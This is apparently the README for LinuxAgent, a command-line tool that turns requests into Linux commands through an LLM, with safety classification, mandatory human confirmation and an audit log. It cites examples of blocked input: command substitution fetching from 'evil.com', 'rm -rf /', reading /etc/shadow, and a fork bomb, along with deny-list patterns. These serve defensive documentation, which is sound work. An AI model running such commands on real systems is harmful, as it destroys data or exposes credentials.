<div align="center">
  <h1>LinuxAgent</h1>
  <img src="logo.jpg" alt="LinuxAgent Logo" width="320" />

  <p>
    <a href="https://github.com/Eilen6316/LinuxAgent.git"><img src="https://img.shields.io/badge/GitHub-Repository-black?style=flat-square&logo=github" alt="GitHub"></a>
    <a href="https://gitcode.com/qq_69174109/LinuxAgent.git"><img src="https://img.shields.io/badge/GitCode-Repository-blue?style=flat-square&logo=git" alt="GitCode"></a>
    <a href="https://gitee.com/xinsai6316/LinuxAgent.git"><img src="https://img.shields.io/badge/Gitee-Repository-red?style=flat-square&logo=gitee" alt="Gitee"></a>
    <a href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=o2ByKsl_gBN-fODJxH4Ps4Xboa_hCSI3&authKey=nVfsLJBin1CnZBd9pPNkxFk%2FGFqCe1FLsRMQmmxv%2FQnM78bC%2FjcWyMSeQcJDZC1U&noverify=0&group_code=281392454"><img src="https://img.shields.io/badge/QQ_Group-281392454-brightgreen?style=flat-square&logo=tencent-qq" alt="QQ Group"></a>
    <a href="https://blog.csdn.net/qq_69174109/article/details/146365413"><img src="https://img.shields.io/badge/CSDN-Project_Intro-blue?style=flat-square&logo=csdn" alt="CSDN"></a>
  </p>

  <p><em>LLM-driven Linux operations assistant CLI with mandatory Human-in-the-Loop safety</em></p>

  <p>
    <a href="README.md">README (short)</a> ·
    <a href="README_CN.md">简体中文</a>
  </p>
</div>

---

## What is LinuxAgent

**LinuxAgent** translates plain-language ops requests into Linux commands your team actually wants to run. Every LLM-generated command goes through token-level safety classification, every side-effecting action requires a human to press `y` in a terminal, and every decision is written to an append-only audit log.

Built on **LangGraph** for state-machine orchestration, **LangChain** for model abstraction, and **Pydantic v2** for fail-fast configuration. No local deep-learning stack is required.

### Who it's for

- Daily Linux ops: file inspection, log tailing, resource usage, service status
- SSH cluster operations: run one command across many hosts with automatic batch confirmation
- Interactive troubleshooting: let the model propose commands; you decide whether to run them
- Environments with audit requirements: every action appended to a local JSONL log

### Design principles

1. **The model is never trusted.** An LLM-generated command defaults to CONFIRM on its first appearance.
2. **Destructive commands are never permanently whitelisted.** `rm -rf`, `mkfs`, `systemctl stop`, etc. re-prompt every time.
3. **Batches must be explicit.** SSH to ≥2 hosts triggers a batch-confirmation flow by default.
4. **Decisions leave a trail.** Every approval, execution, and refusal is appended to `~/.linuxagent/audit.log`.
5. **No TTY means no silent execution.** CONFIRM requests in non-interactive contexts auto-deny.

---

## Core capabilities

| Capability | Notes |
|---|---|
| Natural language → command | Prompt + tool calling over OpenAI / DeepSeek / Anthropic Claude |
| Structured planning | LLM output is validated as JSON `CommandPlan` before any policy check or execution |
| Policy engine | `SAFE` / `CONFIRM` / `BLOCK` plus `risk_score`, `capabilities`, and audit-friendly `matched_rule` |
| Runbooks | 8 YAML runbooks matched before LLM command generation; safe follow-up steps continue after one approval |
| Human-in-the-Loop | LangGraph `interrupt()` + `MemorySaver` for interrupt / persist / resume |
| Session whitelist | Approved SAFE commands skip confirmation within the same process; destructive commands never enter |
| Cluster batch execution | SSH connection pool + concurrent fan-out + failure isolation, async wrapping paramiko |
| Audit log | JSONL append-only, `0o600`, never rotated, cannot be disabled |
| Monitoring alerts | CPU, memory, and root filesystem threshold alerts surfaced by `linuxagent check` |
| Intelligence modules | Usage stats, API-based semantic similarity, recommendations, knowledge base |
| Testability | 238 unit tests + 12 HITL YAML scenarios + integration scaffolding, 86%+ coverage |

---

## 30-second tour

```
you: find services listening on port 8080

 ┌─────────────────┐
 │  parse_intent   │   LLM proposes:  ss -tlnp sport = :8080
 └────────┬────────┘
          ▼
 ┌─────────────────┐
 │  safety_check   │   token-level classification → CONFIRM (LLM first-run)
 └────────┬────────┘
          ▼
 ┌─────────────────┐
 │     confirm     │   terminal shows a confirmation panel:
 │  (interrupt)    │     Command: ss -tlnp sport = :8080
 │                 │     Safety:  CONFIRM
 │                 │     Rule:    LLM_FIRST_RUN
 │                 │     Source:  llm
 │                 │   > Allow this operation? [y/N]
 └────────┬────────┘
          ▼ y
 ┌─────────────────┐
 │     execute     │   asyncio.create_subprocess_exec(*argv)
 └────────┬────────┘
          ▼
 ┌─────────────────┐
 │     analyze     │   LLM summarises raw output for an operator
 └────────┬────────┘
          ▼
        you ← "nginx (PID 4312) owns 8080, running as root"

 every step is appended to ~/.linuxagent/audit.log
```

---

## Full comparison with the original prototype

The earlier incarnation was a monolithic agent script. To make it production-fit for ops, the current release is a full rewrite across four dimensions: **algorithms, architecture, safety, and testing**.

### Architecture

| Aspect | Previous | Current `v4` |
|---|---|---|
| Agent class | One 4710-line God Object covering parsing, execution, UI, SSH, monitoring | `app/agent.py` at **72 lines**, pure coordinator wiring graph / ui / services |
| Flow control | Recursive `process_user_input` with nested `if/else` | LangGraph `StateGraph`, explicit nodes + conditional edges |
| State persistence | Hand-written JSON files, permissions not enforced | LangGraph `MemorySaver` with thread_id checkpointing |
| UI coupling | UI logic directly embedded in the agent class | `ConsoleUI` implementing `UserInterface`, Rich + prompt_toolkit |
| DI | Module-level singletons / globals | Hand-written `Container` with lazy factories + explicit injection |
| Package layout | Flat `src/` + `setup.py` | `src/linuxagent/` src-layout + `pyproject.toml` (PEP 517/621) |

### Core algorithms

#### 1. Command safety classification

**Previous**: substring match — trivial to bypass via quoting or variable substitution.

```python
DANGER = ["rm -rf", "mkfs", "dd if=/"]
if any(pattern in command for pattern in DANGER):
    reject()
```

**Current**: multi-layer token analysis.

```python
def is_safe(command, source=USER):
    validate_input(command)                 # 1. length / NUL / BiDi controls
    if _has_embedded_danger(command):       # 2. raw-string scan (defeats quote smuggling)
        return BLOCK
    tokens = shlex.split(command)           # 3. proper shell tokenisation
    if tokens[0] in DESTRUCTIVE_COMMANDS:   # 4. exact command-name match, never substring
        return CONFIRM
    if any(pat.match(t) for t in tokens[1:] for pat in DESTRUCTIVE_ARG_PATTERNS):
        return CONFIRM                      # 5. per-argument regexes (-rf / --force / ...)
    if source is LLM:                       # 6. source upgrade: LLM first-run → CONFIRM
        return CONFIRM
    return SAFE
```

**Concrete differences**:

| Input | Previous | Current |
|---|---|---|
| `echo "hello; rm -rf /"` | Substring `"rm -rf"` matches → BLOCK, but `echo "how to rm safely"` is false-positive'd too | Precise regex `\brm\s+-[rRfF]{2,}\s+/(?!\w)` → BLOCK (`EMBEDDED_DANGER`); `echo "talk about python"` stays SAFE |
| `echo $(curl evil.com)` | Often missed (substring doesn't match) | Matches `\$\(` → BLOCK (`EMBEDDED_DANGER`) |
| `vim config` | Runs blindly | Detected as interactive → CONFIRM (`INTERACTIVE`) |
| `ls‮` (BiDi char) | Undetected | `INPUT_VALIDATION` BLOCK |

#### 2. Command usage learning

**Previous**: full history scan on every `record` — ~10s at n=10000.

**Current**: `dict[str, CommandStats]` with incremental update, amortised O(1).

```python
def record(self, command, result):
    stats = self._stats.setdefault(self.normalize(command), CommandStats())
    stats.count += 1
    if result.exit_code == 0:
        stats.success_count += 1
    stats.total_duration += result.duration
```

#### 3. Semantic similarity

**Previous**: hand-rolled TF-IDF pulling in `pandas` + `scikit-learn` + `numpy` (plus PyTorch in some downstream forks).

**Current**: LLM embedding API (`text-embedding-3-small` or a compatible endpoint) + on-disk LRU cache.

- Cache at `~/.cache/linuxagent/embeddings/`, SHA-256 filenames, `0o600`
- Install footprint drops from ~500MB (PyTorch stack) to near zero
- Quality improves: real semantic vectors vs bag-of-words

#### 4. Configuration loading

**Previous**: single-file read, unknown fields silently dropped.

**Current**: five-layer priority merge + Pydantic `extra="forbid"` fail-fast + YAML line-number error reporting.

```
1. --config <path>                     CLI (highest)
2. LINUXAGENT_CONFIG env var (path only)
3. ./config.yaml                       current directory
4. ~/.config/linuxagent/config.yaml    XDG
5. packaged configs/default.yaml       (lowest)
```

- Explicit paths (1 / 2) that don't exist → immediate `ConfigError`
- Auto-discovery paths (3 / 4) are silently skipped when absent
- User-supplied files must be `chmod 0600` and owned by the invoking user
- Validation errors include YAML line numbers: `api.timeout: Input should be valid at line 12`

#### 5. SSH host trust

**Previous**: `AutoAddPolicy` — silently accepts any host key on first contact, a trivial MITM path.

**Current**: `RejectPolicy` + `load_system_host_keys()`; unknown hosts raise `SSHUnknownHostError`.

```python
if self._allow_unknown_hosts:
    # Explicit opt-in; WarningPolicy prints on each unknown host
    client.set_missing_host_key_policy(paramiko.WarningPolicy())
else:
    client.set_missing_host_key_policy(paramiko.RejectPolicy())
```

A CI red-line check `! grep -rn "AutoAddPolicy" src/linuxagent/` prevents accidental regression.

Remote execution is also narrower than local execution. Cluster commands are
accepted only as simple argv-like commands; shell sequencing, pipes,
redirects, command substitution, and variable expansion are blocked before
confirmation and again before SSH connection setup.

### Safety model

| Policy | Previous | Current `v4` |
|---|---|---|
| First model-generated command | runs directly | forced CONFIRM (`LLM_FIRST_RUN`) |
| Re-running an approved command | every run re-prompts | whitelisted within the session, cleared on exit |
| Destructive commands | string blacklist | token match + raw scan + subcommand regex, **never** whitelisted |
| Batch cluster operations | silent spread | hosts ≥ `cluster.batch_confirm_threshold` (default 2) forces CONFIRM; shell syntax is blocked before SSH |
| Non-interactive environment | can be bypassed | no-TTY confirm auto-returns `non_tty_auto_deny` |
| Audit trail | optional | hash-chained HITL events appended to `~/.linuxagent/audit.log` at `0o600`, verifiable with `linuxagent audit verify` |

### Testing and engineering

| Aspect | Previous | Current `v4` |
|---|---|---|
| Unit tests | 0 | **238 passing** |
| Coverage | 0 | **86.91%** (`--cov-fail-under=80` gate) |
| Static analysis | none | `ruff check` + `mypy --strict` + `bandit`, all clean |
| Red-line gates | none | CI greps `shell=True` / `AutoAddPolicy` / bare `except:` / `input(` in graph nodes |
| End-to-end scenarios | none | 12 YAML scenarios covering basic / dangerous / HITL / batch cluster / remote shell guard / runbook |
| Release flow | manual | tag-triggered GitHub Actions builds wheel + sdist + Release |

---

## Installation

### Automated (recommended)

```bash
git clone https://github.com/Eilen6316/LinuxAgent.git
cd LinuxAgent
./scripts/bootstrap.sh     # creates .venv + pip install -e ".[dev]" + seeds config.yaml(0600)
source .venv/bin/activate
```

### Manual

```bash
python3.11 -m venv .venv   # or python3.12
source .venv/bin/activate
pip install -e ".[dev]"
cp configs/example.yaml config.yaml
chmod 600 config.yaml      # required; the loader rejects user configs not at 0600
```

### Optional extras

```bash
pip install -e ".[anthropic]"     # Claude support
pip install -e ".[pyinstaller]"   # single-binary packaging
```

### Runtime requirements

- Python 3.11 or 3.12
- Linux (macOS works for development, Windows is not supported)
- For cluster mode: `~/.ssh/known_hosts` must already contain the target hosts

---

## Configuration

### Minimal working config

```yaml
# ./config.yaml (chmod 600)
api:
  api_key: "sk-replace-me"   # required
```

All other fields can stay at their defaults (default provider is DeepSeek; switch to `openai` / `anthropic` as needed).

### Validate

```bash
linuxagent check
# Sample output:
# OK: provider=deepseek, model=deepseek-chat,
#     batch_confirm_threshold=2, audit_log=/home/you/.linuxagent/audit.log
```

### Field reference

| Section | Field | Default | Description |
|---|---|---|---|
| `api` | `provider` | `deepseek` | `openai` / `deepseek` / `anthropic` |
| `api` | `base_url` | `https://api.deepseek.com/v1` | OpenAI-compatible endpoint |
| `api` | `model` | `deepseek-chat` | Model name |
| `api` | `api_key` | `""` | **Required**; `SecretStr`, never printed |
| `api` | `timeout` | `30.0` | Per-request timeout (s) |
| `api` | `stream_timeout` | `60.0` | Overall stream timeout (s) |
| `api` | `max_retries` | `3` | Exponential-backoff retry attempts |
| `security` | `command_timeout` | `30.0` | Max local command runtime |
| `security` | `max_command_length` | `2048` | Per-command character cap |
| `security` | `session_whitelist_enabled` | `true` | Toggle the session whitelist |
| `cluster` | `batch_confirm_threshold` | `2` | Host count that triggers batch confirm |
| `cluster` | `hosts` | `[]` | Cluster host list |
| `audit` | `path` | `~/.linuxagent/audit.log` | Audit log location; **audit cannot be disabled** |
| `telemetry` | `exporter` | `local` | Local JSONL spans by default; `none` disables writes |
| `telemetry` | `path` | `~/.linuxagent/telemetry.jsonl` | Local telemetry path |
| `ui` | `theme` | `auto` | `auto` / `light` / `dark` |
| `ui` | `max_chat_history` | `20` | Max context messages |
| `logging` | `level` | `INFO` | `DEBUG` / `INFO` / `WARNING` / ... |
| `logging` | `format` | `console` | `console` (Rich colour) / `json` (production) |
| `intelligence` | `embedding_model` | `text-embedding-3-small` | Semantic search model; **local PyTorch models are disallowed** |

Full example: [`configs/example.yaml`](configs/example.yaml).

---

## Usage tutorial

### Start the CLI

```bash
linuxagent chat
```

You'll see a welcome panel followed by the prompt:

```
╭─────────────────────────────────────╮
│ LinuxAgent 2026 Ops Console         │
│ HITL-safe command automation with   │
│ audit trails                        │
╰─────────────────────────────────────╯

linuxagent ❯
```

### Scenario 1: safe command (SAFE path)

```
linuxagent ❯ list files in the current directory

[LLM proposes] ls -la

╭──── Human confirmation required ────╮
│ Command  ls -la                     │
│ Safety   CONFIRM                    │
│ Rule     LLM_FIRST_RUN              │
│ Source   llm                        │
╰──────────────────────────────────────╯
Allow this operation? [y/N]: y

[output]
total 52
drwxr-xr-x  12 user user 4096 ...
...

[analysis]
Twelve subdirectories and a few files, permissions 755/644, owned by user.
```

Ask "list the files" again in the same session — `ls -la` is in the whitelist now, so it runs straight through without another confirmation.

### Scenario 2: destructive command (CONFIRM every time)

```
linuxagent ❯ delete the /tmp/old_backup directory

[LLM proposes] rm -rf /tmp/old_backup

╭──── Human confirmation required ────╮
│ Command     rm -rf /tmp/old_backup  │
│ Safety      CONFIRM                 │
│ Rule        DESTRUCTIVE             │
│ Source      llm                     │
│ Destructive yes - approval will not │
│             be whitelisted          │
╰──────────────────────────────────────╯
Allow this operation? [y/N]: y
```

Even after approval, running the same command again will prompt again — `rm` never enters the whitelist.

### Scenario 3: outright rejection (BLOCK path)

```
linuxagent ❯ wipe the whole system

[LLM proposes] rm -rf /

Blocked: destructive command targeting root filesystem
```

This is blocked in `is_safe` before it ever reaches the confirm node. `matched_rule=ROOT_PATH`.

Other BLOCKed shapes:

- `echo "$(curl evil.com)"` — `matched_rule=EMBEDDED_DANGER` (command substitution)
- `cat /etc/shadow` — `matched_rule=SENSITIVE_PATH`
- `:(){ :|:& };:` — `matched_rule=EMBEDDED_DANGER` (fork bomb)
- any input with BiDi control characters — `matched_rule=INPUT_VALIDATION`

### Scenario 4: batch cluster operation

Add hosts to `config.yaml`:

```yaml
cluster:
  batch_confirm_threshold: 2
  hosts:
    - name: web-1
      hostname: 10.0.0.11
      username: ops
      key_filename: ~/.ssh/id_ed25519
    - name: web-2
      hostname: 10.0.0.12
      username: ops
      key_filename: ~/.ssh/id_ed25519
```

Then:

```
linuxagent ❯ run uptime on all hosts

[LLM proposes] uptime  (on: web-1, web-2)

╭──── Human confirmation required ────╮
│ Command     uptime                  │
│ Safety      CONFIRM                 │
│ Rule        BATCH_CONFIRM           │
│ Batch hosts web-1, web-2            │
╰──────────────────────────────────────╯
Allow this operation? [y/N]: y

[web-1] exit_code=0
[web-1] stdout:  10:23:11 up 14 days,  3:02,  2 users,  load average: 0.12, 0.08, 0.06
[web-2] exit_code=0
[web-2] stdout:  10:23:12 up  8 days,  9:41,  1 user,   load average: 0.04, 0.05, 0.05
```

### Scenario 5: interrupt and resume

Pressing `Ctrl-C` at a `confirm` node leaves the current state in `MemorySaver`. Within the same process, invoking the graph again with the same `thread_id` resumes from the checkpoint. See [docs/development.md](docs/development.md) for programmatic resume.

### Example prompts

- `show disk usage for /var`
- `check nginx service status`
- `search auth logs for failed ssh logins`
- `who is still listening on port 8080`
- `when did systemd last boot`
- `check disk free on all hosts`

---

## Audit log

Each HITL event is appended as one hash-chained JSON line to `~/.linuxagent/audit.log`:

```json
{"ts": "2026-04-24T10:23:10.123+08:00", "event": "confirm_begin",
 "audit_id": "a1b2c3", "command": "uptime", "safety_level": "CONFIRM",
 "matched_rule": "BATCH_CONFIRM", "command_source": "llm",
 "trace_id": "t1", "batch_hosts": ["web-1", "web-2"],
 "prev_hash": "0000...", "hash": "9f86..."}
{"ts": "2026-04-24T10:23:14.456+08:00", "event": "confirm_decision",
 "audit_id": "a1b2c3", "decision": "yes", "latency_ms": 4333,
 "trace_id": "t1", "prev_hash": "9f86...", "hash": "3a6e..."}
{"ts": "2026-04-24T10:23:15.890+08:00", "event": "command_executed",
 "audit_id": "a1b2c3", "command": "uptime", "exit_code": 0,
 "duration_ms": 187, "trace_id": "t1", "batch_hosts": ["web-1", "web-2"],
 "prev_hash": "3a6e...", "hash": "b4c1..."}
```

Verify integrity:

```bash
linuxagent audit verify
```

Handy post-incident queries:

```bash
# Every approved decision
jq 'select(.event=="confirm_decision" and .decision=="yes")' ~/.linuxagent/audit.log

# Full trace for one HITL round
jq 'select(.audit_id=="a1b2c3")' ~/.linuxagent/audit.log

# Full trace across audit records
jq 'select(.trace_id=="t1")' ~/.linuxagent/audit.log

# Refused decisions
jq 'select(.event=="confirm_decision" and .decision!="yes")' ~/.linuxagent/audit.log
```

---

## FAQ

**Q: `linuxagent check` complains `must have permissions 0600`?**
A: R-SEC-04 requires user configs to be `0o600` and owned by the invoking user. Run `chmod 600 config.yaml`.

**Q: `linuxagent chat` raises `api.api_key is required`?**
A: Set a real value for `api.api_key` in `./config.yaml`.

**Q: Why was my command blocked?**
A: Look for `matched_rule` in stderr:

- `EMBEDDED_DANGER` — raw-string scan found a dangerous pattern (common with LLM payloads smuggled through echo)
- `SENSITIVE_PATH` — touched `/etc/shadow`, `/boot`, etc.
- `ROOT_PATH` — target is the root filesystem
- `INPUT_VALIDATION` — length / NUL / BiDi control character
- `PARSE_ERROR` — `shlex` refused to tokenise

**Q: Can `--yes` / `--no-confirm` skip every confirmation?**
A: Deliberately no. `--yes` only downgrades dialog-level confirmations; command-level CONFIRM / BLOCK are unaffected. Non-interactive callers hit `non_tty_auto_deny`.

**Q: Can I disable the audit log?**
A: No. `AuditConfig` exposes only `path`, with no `enabled` field.

**Q: How do I SSH in a fresh environment where `known_hosts` is empty?**
A: Construct `SSHManager(config, allow_unknown_hosts=True)` in code. The CLI does not expose this flag on purpose — it's opt-in to avoid accidental MITM exposure.

**Q: Can I use my own OpenAI-compatible gateway?**
A: Yes. Set `api.base_url` to the gateway URL and `api.model` to a model it supports.

---

## Development

```bash
make install   # pip install -e ".[dev]"
make test      # pytest + 80% fail-under, currently 86%+
make lint      # ruff check
make type      # mypy --strict
make security  # red-line grep + bandit
make harness   # YAML scenario harness
make build     # wheel + sdist
linuxagent audit verify
```

Details in [docs/development.md](docs/development.md).

---

## Release

```bash
python -m tests.harness.runner --scenarios tests/harness/scenarios
python -m build --no-isolation
./scripts/verify_wheel_install.sh
git tag v4.0.0
git push origin v4.0.0     # triggers release.yml
```

See [docs/release.md](docs/release.md).

---

## Docs

- [Quick Start](docs/quickstart.md)
- [Development Guide](docs/development.md)
- [Release Guide](docs/release.md)

---

## License

MIT
